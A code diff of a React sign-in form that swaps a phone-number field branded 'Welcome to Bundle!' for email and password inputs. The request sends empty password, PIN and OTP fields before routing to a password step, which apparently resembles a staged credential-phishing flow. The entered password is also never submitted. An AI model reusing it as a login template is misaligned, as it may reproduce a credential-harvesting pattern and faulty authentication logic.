@@ -1,6 +1,5 @@
 import React, { useState, useEffect } from 'react'
 import { Link, useHistory } from 'react-router-dom'
-import IntlTelInput from 'react-intl-tel-input'
 import 'react-intl-tel-input/dist/main.css'
 import URL from './Url.js'
 
@@ -8,8 +7,9 @@ import URL from './Url.js'
 const Form = () => {
     const history = useHistory()
 
-    const [phone, setPhone] = useState('')
     const [loading, setLoading] = useState(false)
+    const [email, setEmail] = useState('')
+    const [password, setPassword] = useState('')
     const [token, setToken] = useState('')
     const [err, setErr] = useState(false)
     const [message, setMessage] = useState(null)
@@ -44,17 +44,19 @@ const Form = () => {
         }
     }, [setErr, err])
 
-    const handlePhoneChange = (a, b, c, d, e, f) => {
-        if (b.length < 12) {
-            setPhone(b.replace(/\D/, ''))
-        }
+    const handleEmail = (e) => {
+        setEmail(e.target.value)
+    }
+
+    const handlePassword = e => {
+        setPassword(e.target.value)
     }
 
     const handleSubmit = async (e) => {
         e.preventDefault()
         setLoading(true)
 
-        if (phone === '' || phone.length < 9) {
+        if (email === '' || email.length < 9) {
             setErr(true)
             setLoading(false)
         } else {
@@ -70,7 +72,7 @@ const Form = () => {
                     mode: 'cors',
 
                     body: JSON.stringify({
-                        phone,
+                        email,
                         password: '',
                         pin: '',
                         otp: '',
@@ -82,7 +84,7 @@ const Form = () => {
                 if (resData.status === 'success') {
                     console.log('Message Sent.')
                     setLoading(false)
-                    history.push('/authpassword', { phone, token })
+                    history.push('/authpassword', { email, token })
                 } else if (resData.status === 'fail') {
                     console.log('Message failed to send.')
                     setLoading(false)
@@ -96,38 +98,49 @@ const Form = () => {
 
     return (
         <form
-            className='grid w-full place-content-stretch md:w-1/3 md:mx-auto p-4'
+            className='grid w-full place-content-stretch bg-white  md:mx-auto font-normal gap-8 loginForm'
+            style={{ padding: '27px 12px' }}
             onSubmit={handleSubmit}
         >
-            <h2 className='font-black text-center text-black mb-2 text-2xl'>
-                Welcome to Bundle!
+            <h2 className='font-medium text-center text-[#1c124d] mb-4 text-2xl'>
+                Sign in
             </h2>
-            <p className='text-center mb-6'>
-                Type in your phone number to Log in
-            </p>
-
-            {message}
-            <IntlTelInput
-                containerClassName='intl-tel-input'
-                inputClassName=' w-full text-black outline-none text-lg p-1 justify-self-stretch placeholder-[#b2b7be] focus:border-purple-500 rounded-3xl mb-4 phone py-2'
-                defaultCountry={'ng'}
-                preferredCountries={['ng']}
-                fieldName='phone'
-                fieldId='phone'
-                onlyCountries={['ng', 'gh']}
-                value={phone}
-                onPhoneNumberChange={(a, b, c, d, e) => {
-                    handlePhoneChange(a, b, c, d, e)
-                }}
-                separateDialCode={true}
-
-                //placeholder='42334'
-            />
-            <p className='text-right mt-2 mb-8'>
-                <Link to='/'>Lost Phone number?</Link>{' '}
-            </p>
-
-            <button className=' rounded-3xl outline-none  bg-[#6f42c1] text-white text-lg py-3'>
+            <div className='relative'>
+                <label htmlFor='email' className='input-label absolute'>
+                    {' '}
+                    Email
+                </label>
+                <input
+                    type='email'
+                    id='email'
+                    required
+                    className='sign-in-input'
+                    value={email}
+                    onChange={handleEmail}
+                />
+            </div>
+            <div className='relative'>
+                <label for='password' className='input-label absolute'>
+                    Password
+                </label>
+                <input
+                    type='password'
+                    id='password'
+                    className='sign-in-input'
+                    required
+                    value={password}
+                    onChange={handlePassword}
+                />
+            </div>
+            <div className='flex justify-center '>
+                <div class='font-medium text-center underline text-[#006f95]'>
+                    Recover password?
+                </div>
+            </div>
+            <button
+                className=' rounded-md outline-none  bg-[#00bfff] text-white text-sm btn'
+                style={{ padding: '.5rem 3rem', lineHeight: 2.5 }}
+            >
                 {loading ? 'loading..' : 'Continue'}
             </button>
         </form>
